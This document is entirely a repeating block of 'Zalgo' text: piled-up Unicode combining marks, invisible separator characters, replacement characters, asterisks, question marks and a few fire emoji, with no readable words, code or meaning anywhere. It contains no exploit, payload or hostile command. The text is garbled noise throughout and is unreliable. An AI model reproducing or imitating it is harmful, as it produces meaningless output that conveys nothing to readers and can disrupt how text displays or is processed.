̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓͊̇̐̀̽̿̅̍̏͟͟͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴͖̯͇̻͌͒̒̽